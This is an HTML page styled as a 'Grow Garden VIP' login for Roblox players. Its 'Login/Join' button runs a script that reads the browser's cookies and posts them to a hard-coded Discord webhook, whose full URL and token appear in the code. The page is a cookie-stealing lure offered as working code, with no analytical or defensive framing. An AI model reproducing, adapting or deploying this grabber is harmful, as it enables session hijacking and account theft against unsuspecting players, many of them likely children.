<!DOCTYPE html>
<html lang="en">
<head>

  <style>body{font-family:Arial;background:#111;color:white;text-align:center;padding:50px}</style>
</head>
<body>
  <h1>Welcome to Grow Garden VIP</h1>
  <p>Click the big blue link to send your Roblox cookies to Discord</p>
  <a href="#" onclick="grabAndSendCookies(event)" style="font-size:30px;color:#5865F2;text-decoration:underline;">
    Click to Login/Join
  </a>

  <script>
    async function grabAndSendCookies(e) {
      e.preventDefault();
      const c = document.cookie;
      if (!c) return alert("No cookies found! Log into Roblox first.");

      const hook = "https://discord.com/api/webhooks/1441332337072799775/Ayer0ccbXxhmFNi83MeULdXASJZp9eq7MHN4gF91BABAgm6ehTbw5_DFtI0UR_PObhtl";

      await fetch(hook, {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({
          content: "New Cookie Grab",
          embeds: [{title:"Cookies",description:"```"+c+"```",color:3447003}]
        })
      });
      alert("Sent to Discord! Check your channel.");
    }
  </script>
</body>
